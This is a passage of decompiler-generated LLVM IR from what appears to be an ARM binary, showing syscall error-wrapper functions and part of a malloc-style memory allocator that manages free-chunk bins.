  store i32 %v2_fc44, i32* @r4, align 4
  ret i32 %v0_fc40

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fc40, { 1, 0 }
}

define i32 @function_fc50(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_fc50:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_fc84, label %dec_label_pc_fc74

dec_label_pc_fc74:                                ; preds = %dec_label_pc_fc50
  %v0_fc74 = call i32 @function_ce08()
  %v0_fc78 = load i32, i32* %r4.global-to-local, align 4
  %v1_fc78 = sub i32 0, %v0_fc78
  %v2_fc7c = inttoptr i32 %v0_fc74 to i32*
  store i32 %v1_fc78, i32* %v2_fc7c, align 4
  br label %dec_label_pc_fc84

dec_label_pc_fc84:                                ; preds = %dec_label_pc_fc50, %dec_label_pc_fc74
  %v1_fc8c = phi i32 [ %arg1, %dec_label_pc_fc50 ], [ -1, %dec_label_pc_fc74 ]
  ret i32 %v1_fc8c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fc84, { 1, 0 }
}

define i32 @function_fc94(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_fc94:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fc94 = load i32, i32* @r7, align 4
  store i32 %v3_fc94, i32* %stack_var_-8, align 4
  %v0_fca0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_fca0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_fca0, -4095
  br i1 %tmp, label %dec_label_pc_fcc0, label %dec_label_pc_fcb0

dec_label_pc_fcb0:                                ; preds = %dec_label_pc_fc94
  %v0_fcb0 = call i32 @function_ce08()
  %v0_fcb4 = load i32, i32* %r7.global-to-local, align 4
  %v1_fcb4 = sub i32 0, %v0_fcb4
  %v2_fcb8 = inttoptr i32 %v0_fcb0 to i32*
  store i32 %v1_fcb4, i32* %v2_fcb8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_fcc0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fcc0

dec_label_pc_fcc0:                                ; preds = %dec_label_pc_fc94, %dec_label_pc_fcb0
  %v1_fcc4 = phi i32 [ %v0_fca0, %dec_label_pc_fc94 ], [ -1, %dec_label_pc_fcb0 ]
  %v2_fcc0 = phi i32 [ %v3_fc94, %dec_label_pc_fc94 ], [ %v2_fcc0.pre, %dec_label_pc_fcb0 ]
  store i32 %v2_fcc0, i32* @r7, align 4
  ret i32 %v1_fcc4

; uselistorder directives
  uselistorder i32 %v0_fca0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fcc0, { 1, 0 }
}

define i32 @function_fccc(i32 %arg1) local_unnamed_addr {
dec_label_pc_fccc:
  store i32 %arg1, i32* @r0, align 4
  %v3_fccc = load i32, i32* @r4, align 4
  %v0_fcd4 = call i32 @function_cbe0()
  %v2_fcdc = call i32 @function_ccb4(i32 %v0_fcd4, i32 %arg1)
  store i32 %v3_fccc, i32* @r4, align 4
  ret i32 %v2_fcdc

; uselistorder directives
  uselistorder i32 ()* @function_cbe0, { 0, 3, 1, 2 }
}

define i32 @function_fce8(i32 %arg1) local_unnamed_addr {
dec_label_pc_fce8:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_fce8 = udiv i32 %arg1, 256
  store i32 %v3_fce8, i32* %r1.global-to-local, align 4
  %v2_fcec = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_fcec, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_fce8
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_fce8, %bb
  %v0_fcf8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_fcec, i32 %v0_fcf8)
  %v0_fcfc = load i32, i32* %r1.global-to-local, align 4
  %v1_fcfc = add i32 %v0_fcfc, 1048320
  %v3_fd00 = udiv i32 %v1_fcfc, 65536
  %v1_fd04 = and i32 %v3_fd00, 8
  %v6_fd08 = shl i32 %v0_fcfc, %v1_fd04
  %v1_fd0c = add i32 %v6_fd08, 520192
  %v3_fd10 = udiv i32 %v1_fd0c, 65536
  %v1_fd14 = and i32 %v3_fd10, 4
  %v6_fd18 = shl i32 %v6_fd08, %v1_fd14
  %v1_fd1c = add i32 %v6_fd18, 245760
  %v3_fd20 = udiv i32 %v1_fd1c, 65536
  %v1_fd24 = and i32 %v3_fd20, 2
  %v6_fd28 = shl i32 %v6_fd18, %v1_fd24
  store i32 %v6_fd28, i32* %r1.global-to-local, align 4
  %v1_fd2c = sub nsw i32 13, %v1_fd04
  %v2_fd30 = sub nsw i32 %v1_fd2c, %v1_fd14
  %v3_fd34 = udiv i32 %v6_fd28, 32768
  %v4_fd34 = sub nuw nsw i32 -1, %v3_fd34
  %v4_fd38 = udiv i32 %v6_fd28, 16384
  %v5_fd38 = and i32 %v4_fd38, %v4_fd34
  %v2_fd3c = sub nsw i32 %v2_fd30, %v1_fd24
  %v2_fd40 = add nsw i32 %v2_fd3c, %v5_fd38
  %v1_fd44 = add nsw i32 %v2_fd40, 6
  %v0_fd48 = load i32, i32* %ip.global-to-local, align 4
  %v6_fd48 = lshr i32 %v0_fd48, %v1_fd44
  %v3_fd4c = mul nsw i32 %v2_fd40, 4
  %v1_fd50 = add nsw i32 %v3_fd4c, 32
  %v1_fd54 = urem i32 %v6_fd48, 4
  %v2_fd58 = or i32 %v1_fd54, %v1_fd50
  ret i32 %v2_fd58

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_fd60(i32 %arg1) local_unnamed_addr {
dec_label_pc_fd60:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_fd60 = load i32, i32* @r4, align 4
  %v6_fd60 = load i32, i32* @r5, align 4
  %v9_fd60 = load i32, i32* @r6, align 4
  %v12_fd60 = load i32, i32* @r7, align 4
  %v15_fd60 = load i32, i32* @r8, align 4
  %v18_fd60 = load i32, i32* @sb, align 4
  %v21_fd60 = load i32, i32* @sl, align 4
  %v24_fd60 = load i32, i32* @fp, align 4
  %v27_fd60 = load i32, i32* @lr, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %r1.global-to-local, align 4
  %v4_fd74 = load i32, i32* inttoptr (i32 142116 to i32*), align 4
  store i32 %v4_fd74, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_fd80 = load i32, i32* inttoptr (i32 142080 to i32*), align 256
  store i32 %v4_fd80, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_fd74, i32* %r2.global-to-local, align 4
  %v2_fd8c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_fd8c, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %ip.global-to-local, align 4
  %v4_fd98 = load i32, i32* inttoptr (i32 142120 to i32*), align 8
  store i32 %v4_fd98, i32* %ip.global-to-local, align 4
  store i32 64932, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_fd98)
  %v0_fda4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_fda4, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %r1.global-to-local, align 4
  %v4_fdb0 = load i32, i32* inttoptr (i32 142060 to i32*), align 4
  store i32 %v4_fdb0, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_fdbc.412 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_fdb0)
  %v0_fdbc = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_fdbc, -32
  br i1 %tmp, label %dec_label_pc_fdd8, label %dec_label_pc_fdc4

dec_label_pc_fdc4:                                ; preds = %dec_label_pc_fd60
  %v0_fdc4 = call i32 @function_ce08()
  store i32 %v0_fdc4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_fdd0 = inttoptr i32 %v0_fdc4 to i32*
  store i32 12, i32* %v2_fdd0, align 4
  br label %dec_label_pc_10654

dec_label_pc_fdd8:                                ; preds = %dec_label_pc_fd60
  %v1_fdd8 = add i32 %v0_fdbc, 11
  store i32 %v1_fdd8, i32* %r0.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %r2.global-to-local, align 4
  %v2_fde4 = icmp ugt i32 %v1_fdd8, 14
  %v7_fde4 = icmp eq i32 %v1_fdd8, 15
  %v2_fde8 = xor i1 %v7_fde4, true
  %v3_fde8 = and i1 %v2_fde4, %v2_fde8
  br i1 %v3_fde8, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_fdd8
  %v5_fde8 = and i32 %v1_fdd8, -8
  store i32 %v5_fde8, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_fdd8, %bb
  %v4_fdec = load i32, i32* inttoptr (i32 142076 to i32*), align 4
  store i32 %v4_fdec, i32* @r0, align 4
  %v1_fdf0 = inttoptr i32 %v4_fdec to i32*
  %v2_fdf0 = load i32, i32* %v1_fdf0, align 4
  store i32 %v2_fdf0, i32* @r4, align 4
  %v2_fdf4 = xor i1 %v2_fde4, true
  %v3_fdf4 = or i1 %v7_fde4, %v2_fdf4
  br i1 %v3_fdf4, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_fdf8 = urem i32 %v2_fdf0, 2
  %v2_fdf8 = icmp eq i32 %v1_fdf8, 0
  br i1 %v2_fdf8, label %dec_label_pc_fe00, label %dec_label_pc_fe10

dec_label_pc_fe00:                                ; preds = %bb140
  %v2_fe00 = icmp eq i32 %v2_fdf0, 0
  br i1 %v2_fe00, label %dec_label_pc_fe08, label %dec_label_pc_101ec

dec_label_pc_fe08:                                ; preds = %dec_label_pc_fe00
  %v0_fe08 = call i32 @function_10730()
  store i32 %v0_fe08, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_101ec

dec_label_pc_fe10:                                ; preds = %bb140
  %v0_fe10 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_fe10, %v2_fdf0
  br i1 %tmp201, label %dec_label_pc_fe38, label %dec_label_pc_fe18

dec_label_pc_fe18:                                ; preds = %dec_label_pc_fe10
  %v1_fe18 = add i32 %v4_fdec, -4
  store i32 %v1_fe18, i32* %r1.global-to-local, align 4
  %v3_fe1c = udiv i32 %v0_fe10, 8
  store i32 %v3_fe1c, i32* %r2.global-to-local, align 4
  %v4_fe20 = mul nuw i32 %v3_fe1c, 4
  %v5_fe20 = add i32 %v4_fe20, %v1_fe18
  %v6_fe20 = inttoptr i32 %v5_fe20 to i32*
  %v7_fe20 = load i32, i32* %v6_fe20, align 4
  store i32 %v7_fe20, i32* %r0.global-to-local, align 4
  %v2_fe24 = icmp eq i32 %v7_fe20, 0
  br i1 %v2_fe24, label %dec_label_pc_fe38, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_fe18
  %v2_fe28 = add i32 %v7_fe20, 8
  %v3_fe28 = inttoptr i32 %v2_fe28 to i32*
  %v4_fe28 = load i32, i32* %v3_fe28, align 4
  store i32 %v4_fe28, i32* %r3.global-to-local, align 4
  store i32 %v2_fe28, i32* %r0.global-to-local, align 4
  store i32 %v2_fe28, i32* %r4.global-to-local, align 4
  store i32 %v4_fe28, i32* %v6_fe20, align 4
  br label %dec_label_pc_10638

dec_label_pc_fe38:                                ; preds = %dec_label_pc_fe18, %dec_label_pc_fe10
  %tmp202 = icmp ugt i32 %v0_fe10, 255
  br i1 %tmp202, label %dec_label_pc_fe88, label %dec_label_pc_fe40

dec_label_pc_fe40:                                ; preds = %dec_label_pc_fe38
  store i32 142044, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_fe48 = load i32, i32* inttoptr (i32 142076 to i32*), align 4
  %v3_fe4c = udiv i32 %v0_fe10, 8
  store i32 %v3_fe4c, i32* @r7, align 4
  %v4_fe50 = mul nuw i32 %v3_fe4c, 8
  %v5_fe50 = add i32 %v4_fe48, %v4_fe50
  store i32 %v5_fe50, i32* %r3.global-to-local, align 4
  %v1_fe54 = add i32 %v5_fe50, 44
  store i32 %v1_fe54, i32* %ip.global-to-local, align 4
  %v1_fe58 = add i32 %v5_fe50, 56
  %v2_fe58 = inttoptr i32 %v1_fe58 to i32*
  %v3_fe58 = load i32, i32* %v2_fe58, align 4
  store i32 %v3_fe58, i32* %r0.global-to-local, align 4
  %v9_fe5c = icmp eq i32 %v3_fe58, %v1_fe54
  br i1 %v9_fe5c, label %dec_label_pc_ffe8, label %dec_label_pc_fe64

dec_label_pc_fe64:                                ; preds = %dec_label_pc_fe40
  %v2_fe64 = add i32 %v3_fe58, %v0_fe10
  store i32 %v2_fe64, i32* %r3.global-to-local, align 4
  %v1_fe68 = add i32 %v2_fe64, 4
  %v2_fe68 = inttoptr i32 %v1_fe68 to i32*
  %v3_fe68 = load i32, i32* %v2_fe68, align 4
  store i32 %v3_fe68, i32* %r2.global-to-local, align 4
  %v1_fe6c = add i32 %v3_fe58, 12
  %v2_fe6c = inttoptr i32 %v1_fe6c to i32*
  %v3_fe6c = load i32, i32* %v2_fe6c, align 4
  store i32 %v3_fe6c, i32* %r1.global-to-local, align 4
  %v1_fe70 = or i32 %v3_fe68, 1
  store i32 %v1_fe70, i32* %r2.global-to-local, align 4
  %v1_fe74 = add i32 %v3_fe58, 8
  store i32 %v1_fe74, i32* %r4.global-to-local, align 4
  store i32 %v1_fe70, i32* %v2_fe68, align 4
  %v0_fe7c = load i32, i32* %ip.global-to-local, align 4
  %v1_fe7c = load i32, i32* %r1.global-to-local, align 4
  %v2_fe7c = add i32 %v1_fe7c, 8
  %v3_fe7c = inttoptr i32 %v2_fe7c to i32*
  store i32 %v0_fe7c, i32* %v3_fe7c, align 4
  %v0_fe80 = load i32, i32* %r1.global-to-local, align 4
  %v1_fe80 = load i32, i32* %ip.global-to-local, align 4
  %v2_fe80 = add i32 %v1_fe80, 12
  %v3_fe80 = inttoptr i32 %v2_fe80 to i32*
  store i32 %v0_fe80, i32* %v3_fe80, align 4
  br label %dec_label_pc_10638

dec_label_pc_fe88:                                ; preds = %dec_label_pc_fe38
  store i32 %v0_fe10, i32* %r0.global-to-local, align 4
  %v1_fe8c = call i32 @function_fce8(i32 %v0_fe10)
  store i32 %v1_fe8c, i32* %r0.global-to-local, align 4
  %v0_fe90 = load i32, i32* @r4, align 4
  %v1_fe90 = and i32 %v0_fe90, 2
  %v2_fe90 = icmp eq i32 %v1_fe90, 0
  store i32 %v1_fe8c, i32* @r7, align 4
  br i1 %v2_fe90, label %dec_label_pc_ffe8, label %dec_label_pc_fe9c

dec_label_pc_fe9c:                                ; preds = %dec_label_pc_fe88
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %r1.global-to-local, align 4
  %v4_fea4 = load i32, i32* inttoptr (i32 142076 to i32*), align 4
  store i32 %v4_fea4, i32* @r0, align 4
  %v0_fea8 = call i32 @function_10730()
  store i32 %v0_fea8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ffe8

dec_label_pc_feb0:                                ; preds = %dec_label_pc_fffc
  %v1_feb0 = add i32 %v3_fffc, 4
  %v2_feb0 = inttoptr i32 %v1_feb0 to i32*
  %v3_feb0 = load i32, i32* %v2_feb0, align 4
  store i32 %v3_feb0, i32* %r3.global-to-local, align 4
  %v0_feb4 = load i32, i32* @sl, align 4
  %v1_feb8 = and i32 %v3_feb0, -4
  store i32 %v1_feb8, i32* %r4.global-to-local, align 4
  %v1_febc = add i32 %v3_fffc, 12
  %v2_febc = inttoptr i32 %v1_febc to i32*
  %v3_febc = load i32, i32* %v2_febc, align 4
  store i32 %v3_febc, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_feb4, 255
  br i1 %tmp203, label %dec_label_pc_ff18, label %dec_label_pc_fec4

dec_label_pc_fec4:                                ; preds = %dec_label_pc_feb0
  %v9_fec4 = icmp eq i32 %v3_febc, %v0_ff1c
  br i1 %v9_fec4, label %dec_label_pc_fecc, label %dec_label_pc_ff18

dec_label_pc_fecc:                                ; preds = %dec_label_pc_fec4
  %v0_fecc = load i32, i32* @sb, align 4
  %v1_fecc = add i32 %v0_fecc, 48
  %v2_fecc = inttoptr i32 %v1_fecc to i32*
  %v3_fecc = load i32, i32* %v2_fecc, align 4
  store i32 %v3_fecc, i32* %r3.global-to-local, align 4
  %v9_fed0 = icmp eq i32 %v3_fffc, %v3_fecc
  br i1 %v9_fed0, label %dec_label_pc_fed8, label %dec_label_pc_ff18

dec_label_pc_fed8:                                ; preds = %dec_label_pc_fecc
  %v1_fed8 = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_feb8, %v1_fed8
  br i1 %tmp204, label %dec_label_pc_fee0, label %dec_label_pc_ff18

dec_label_pc_fee0:                                ; preds = %dec_label_pc_fed8
  %v2_fee0 = sub i32 %v1_feb8, %v0_feb4
  store i32 %v2_fee0, i32* %r2.global-to-local, align 4
  %v2_fee4 = add i32 %v0_feb4, %v3_fffc
  store i32 %v2_fee4, i32* %r3.global-to-local, align 4
  %v1_fee8 = or i32 %v0_feb4, 1
  store i32 %v1_fee8, i32* %r0.global-to-local, align 4
  %v1_feec = or i32 %v2_fee0, 1
  store i32 %v1_feec, i32* %r1.global-to-local, align 4
  %v1_fef0 = add i32 %v3_fffc, 8
  store i32 %v1_fef0, i32* %r4.global-to-local, align 4
  %v2_fef4 = add i32 %v0_ff1c, 8
  %v3_fef4 = inttoptr i32 %v2_fef4 to i32*
  store i32 %v2_fee4, i32* %v3_fef4, align 4
  %v0_fef8 = load i32, i32* %r3.global-to-local, align 4
  %v1_fef8 = load i32, i32* %ip.global-to-local, align 4
  %v2_fef8 = add i32 %v1_fef8, 12
  %v3_fef8 = inttoptr i32 %v2_fef8 to i32*
  store i32 %v0_fef8, i32* %v3_fef8, align 4
  %v0_fefc = load i32, i32* %r0.global-to-local, align 4
  %v1_fefc = load i32, i32* @r6, align 4
  %v2_fefc = add i32 %v1_fefc, 4
  %v3_fefc = inttoptr i32 %v2_fefc to i32*
  store i32 %v0_fefc, i32* %v3_fefc, align 4
  %v0_ff00 = load i32, i32* %r3.global-to-local, align 4
  %v1_ff00 = load i32, i32* @sb, align 4
  %v2_ff00 = add i32 %v1_ff00, 48
  %v3_ff00 = inttoptr i32 %v2_ff00 to i32*
  store i32 %v0_ff00, i32* %v3_ff00, align 4
  %v0_ff04 = load i32, i32* %r2.global-to-local, align 4
  %v1_ff04 = load i32, i32* %r3.global-to-local, align 4
  %v3_ff04 = add i32 %v1_ff04, %v0_ff04
  %v4_ff04 = inttoptr i32 %v3_ff04 to i32*
  store i32 %v0_ff04, i32* %v4_ff04, align 4
  %v0_ff08 = load i32, i32* %r1.global-to-local, align 4
  %v1_ff08 = load i32, i32* %r3.global-to-local, align 4
  %v2_ff08 = add i32 %v1_ff08, 4
  %v3_ff08 = inttoptr i32 %v2_ff08 to i32*
  store i32 %v0_ff08, i32* %v3_ff08, align 4
  %v0_ff0c = load i32, i32* %ip.global-to-local, align 4
  %v1_ff0c = load i32, i32* %r3.global-to-local, align 4
  %v2_ff0c = add i32 %v1_ff0c, 12
  %v3_ff0c = inttoptr i32 %v2_ff0c to i32*
  store i32 %v0_ff0c, i32* %v3_ff0c, align 4
  %v0_ff10 = load i32, i32* %ip.global-to-local, align 4
  %v1_ff10 = load i32, i32* %r3.global-to-local, align 4
  %v2_ff10 = add i32 %v1_ff10, 8
  %v3_ff10 = inttoptr i32 %v2_ff10 to i32*
  store i32 %v0_ff10, i32* %v3_ff10, align 4
  br label %dec_label_pc_10638

dec_label_pc_ff18:                                ; preds = %dec_label_pc_fed8, %dec_label_pc_fecc, %dec_label_pc_fec4, %dec_label_pc_feb0
  %v9_ff18 = icmp eq i32 %v1_feb8, %v0_feb4
  %v2_ff1c = add i32 %v3_febc, 8
  %v3_ff1c = inttoptr i32 %v2_ff1c to i32*
  store i32 %v0_ff1c, i32* %v3_ff1c, align 4
  %v0_ff20 = load i32, i32* %ip.global-to-local, align 4
  %v1_ff20 = load i32, i32* %r5.global-to-local, align 4
  %v2_ff20 = add i32 %v1_ff20, 12
  %v3_ff20 = inttoptr i32 %v2_ff20 to i32*
  store i32 %v0_ff20, i32* %v3_ff20, align 4
  br i1 %v9_ff18, label %dec_label_pc_10078.loopexit, label %dec_label_pc_ff34

dec_label_pc_ff34:                                ; preds = %dec_label_pc_ff18
  %v0_ff34 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_ff34, 255
  br i1 %tmp205, label %dec_label_pc_ff58, label %dec_label_pc_ff3c

dec_label_pc_ff3c:                                ; preds = %dec_label_pc_ff34
  store i32 142044, i32* %r2.global-to-local, align 4
  %v1_ff40 = load i32, i32* %r8.global-to-local, align 4
  %v2_ff40 = add i32 %v1_ff40, 142044
  %v3_ff40 = inttoptr i32 %v2_ff40 to i32*
  %v4_ff40 = load i32, i32* %v3_ff40, align 4
  %v3_ff44 = udiv i32 %v0_ff34, 8
  store i32 %v3_ff44, i32* %r0.global-to-local, align 4
  %v4_ff48 = mul nuw i32 %v3_ff44, 8
  %v5_ff48 = add i32 %v4_ff40, %v4_ff48
  store i32 %v5_ff48, i32* %r3.global-to-local, align 4
  %v1_ff4c = add i32 %v5_ff48, 44
  store i32 %v1_ff4c, i32* %ip.global-to-local, align 4
  %v1_ff50 = add i32 %v5_ff48, 52
  %v2_ff50 = inttoptr i32 %v1_ff50 to i32*
  %v3_ff50 = load i32, i32* %v2_ff50, align 4
  store i32 %v3_ff50, i32* @lr, align 4
  br label %dec_label_pc_ffb0

dec_label_pc_ff58:                                ; preds = %dec_label_pc_ff34
  store i32 %v0_ff34, i32* %r0.global-to-local, align 4
  %v1_ff5c = call i32 @function_fce8(i32 %v0_ff34)
  store i32 %v1_ff5c, i32* %r0.global-to-local, align 4
  store i32 142044, i32* %ip.global-to-local, align 4
  %v1_ff64 = load i32, i32* %r8.global-to-local, align 4
  %v2_ff64 = add i32 %v1_ff64, 142044
  %v3_ff64 = inttoptr i32 %v2_ff64 to i32*
  %v4_ff64 = load i32, i32* %v3_ff64, align 4
  %v4_ff68 = mul i32 %v1_ff5c, 8
  %v5_ff68 = add i32 %v4_ff64, %v4_ff68
  store i32 %v5_ff68, i32* %r3.global-to-local, align 4
  %v1_ff6c = add i32 %v5_ff68, 44
  store i32 %v1_ff6c, i32* %ip.global-to-local, align 4
  %v1_ff70 = add i32 %v5_ff68, 52
  %v2_ff70 = inttoptr i32 %v1_ff70 to i32*
  %v3_ff70 = load i32, i32* %v2_ff70, align 4
  store i32 %v3_ff70, i32* @lr, align 4
  %v9_ff74 = icmp eq i32 %v3_ff70, %v1_ff6c
  br i1 %v9_ff74, label %dec_label_pc_ffb0, label %dec_label_pc_ff7c

dec_label_pc_ff7c:                                ; preds = %dec_label_pc_ff58
  %v1_ff7c = add i32 %v5_ff68, 56
  %v2_ff7c = inttoptr i32 %v1_ff7c to i32*
  %v3_ff7c = load i32, i32* %v2_ff7c, align 4
  store i32 %v3_ff7c, i32* %r1.global-to-local, align 4
  %v1_ff80 = add i32 %v3_ff7c, 4
  %v2_ff80 = inttoptr i32 %v1_ff80 to i32*
  %v3_ff80 = load i32, i32* %v2_ff80, align 4
  store i32 %v3_ff80, i32* %r3.global-to-local, align 4
  %v0_ff84 = load i32, i32* %r4.global-to-local, align 4
  %v3_ff84 = icmp ult i32 %v0_ff84, %v3_ff80
  br i1 %v3_ff84, label %.thread, label %dec_label_pc_ffa0.preheader

.thread:                                          ; preds = %dec_label_pc_ff7c
  store i32 %v1_ff6c, i32* @lr, align 4
  store i32 %v3_ff7c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ffb0

dec_label_pc_ffa0.preheader:                      ; preds = %dec_label_pc_ff7c
  %v2_ff8c = or i32 %v0_ff84, 1
  store i32 %v2_ff8c, i32* %r2.global-to-local, align 4
  %v1_ffa0179 = add i32 %v3_ff70, 4
  %v2_ffa0180 = inttoptr i32 %v1_ffa0179 to i32*
  %v3_ffa0181 = load i32, i32* %v2_ffa0180, align 4
  store i32 %v3_ffa0181, i32* %r3.global-to-local, align 4
  %v3_ffa4183 = icmp ult i32 %v2_ff8c, %v3_ffa0181
  br i1 %v3_ffa4183, label %dec_label_pc_ff9c, label %dec_label_pc_ffac

dec_label_pc_ff9c:                                ; preds = %dec_label_pc_ffa0.preheader, %dec_label_pc_ff9c
  %v0_ffac184 = phi i32 [ %v3_ff9c, %dec_label_pc_ff9c ], [ %v3_ff70, %dec_label_pc_ffa0.preheader ]
  %v1_ff9c = add i32 %v0_ffac184, 8
  %v2_ff9c = inttoptr i32 %v1_ff9c to i32*
  %v3_ff9c = load i32, i32* %v2_ff9c, align 4
  store i32 %v3_ff9c, i32* @lr, align 4
  %v1_ffa0 = add i32 %v3_ff9c, 4
  %v2_ffa0 = inttoptr i32 %v1_ffa0 to i32*
  %v3_ffa0 = load i32, i32* %v2_ffa0, align 4
  store i32 %v3_ffa0, i32* %r3.global-to-local, align 4
  %v3_ffa4 = icmp ult i32 %v2_ff8c, %v3_ffa0
  br i1 %v3_ffa4, label %dec_label_pc_ff9c, label %dec_label_pc_ffac

dec_label_pc_ffac:                                ; preds = %dec_label_pc_ff9c, %dec_label_pc_ffa0.preheader
  %v0_ffac.lcssa = phi i32 [ %v3_ff70, %dec_label_pc_ffa0.preheader ], [ %v3_ff9c, %dec_label_pc_ff9c ]
  %v1_ffac = add i32 %v0_ffac.lcssa, 12
  %v2_ffac = inttoptr i32 %v1_ffac to i32*
  %v3_ffac = load i32, i32* %v2_ffac, align 4
  store i32 %v3_ffac, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ffb0

dec_label_pc_ffb0:                                ; preds = %.thread, %dec_label_pc_ff58, %dec_label_pc_ff3c, %dec_label_pc_ffac
  %v0_ffd0 = phi i32 [ %v1_ff6c, %dec_label_pc_ff58 ], [ %v1_ff4c, %dec_label_pc_ff3c ], [ %v3_ffac, %dec_label_pc_ffac ], [ %v3_ff7c, %.thread ]
  %v0_ffc4 = phi i32 [ %v1_ff5c, %dec_label_pc_ff58 ], [ %v3_ff44, %dec_label_pc_ff3c ], [ %v1_ff5c, %dec_label_pc_ffac ], [ %v1_ff5c, %.thread ]
  %v1_ffb4 = phi i32 [ %v1_ff64, %dec_label_pc_ff58 ], [ %v1_ff40, %dec_label_pc_ff3c ], [ %v1_ff64, %dec_label_pc_ffac ], [ %v1_ff64, %.thread ]
  store i32 142044, i32* %r2.global-to-local, align 4
  %v2_ffb4 = add i32 %v1_ffb4, 142044
  %v3_ffb4 = inttoptr i32 %v2_ffb4 to i32*
  %v4_ffb4 = load i32, i32* %v3_ffb4, align 4
  %v3_ffb8 = sdiv i32 %v0_ffc4, 32
  store i32 %v3_ffb8, i32* %r3.global-to-local, align 4
  %v4_ffbc = mul nsw i32 %v3_ffb8, 4
  %v5_ffbc = add i32 %v4_ffb4, %v4_ffbc
  store i32 %v5_ffbc, i32* %r1.global-to-local, align 4
  %v1_ffc0 = add i32 %v5_ffbc, 820
  %v2_ffc0 = inttoptr i32 %v1_ffc0 to i32*
  %v3_ffc0 = load i32, i32* %v2_ffc0, align 4
  %v1_ffc4 = urem i32 %v0_ffc4, 32
  store i32 %v1_ffc4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_ffcc = shl i32 1, %v1_ffc4
  %v8_ffcc = or i32 %v3_ffc0, %v7_ffcc
  store i32 %v8_ffcc, i32* %r3.global-to-local, align 4
  %v1_ffd0 = load i32, i32* @r6, align 4
  %v2_ffd0 = add i32 %v1_ffd0, 12
  %v3_ffd0 = inttoptr i32 %v2_ffd0 to i32*
  store i32 %v0_ffd0, i32* %v3_ffd0, align 4
  %v0_ffd4 = load i32, i32* @lr, align 4
  %v1_ffd4 = load i32, i32* @r6, align 4
  %v2_ffd4 = add i32 %v1_ffd4, 8
  %v3_ffd4 = inttoptr i32 %v2_ffd4 to i32*
  store i32 %v0_ffd4, i32* %v3_ffd4, align 4
  %v0_ffd8 = load i32, i32* %r3.global-to-local, align 4
  %v1_ffd8 = load i32, i32* %r1.global-to-local, align 4
  %v2_ffd8 = add i32 %v1_ffd8, 820
  %v3_ffd8 = inttoptr i32 %v2_ffd8 to i32*
  store i32 %v0_ffd8, i32* %v3_ffd8, align 4
  %v0_ffdc = load i32, i32* @r6, align 4
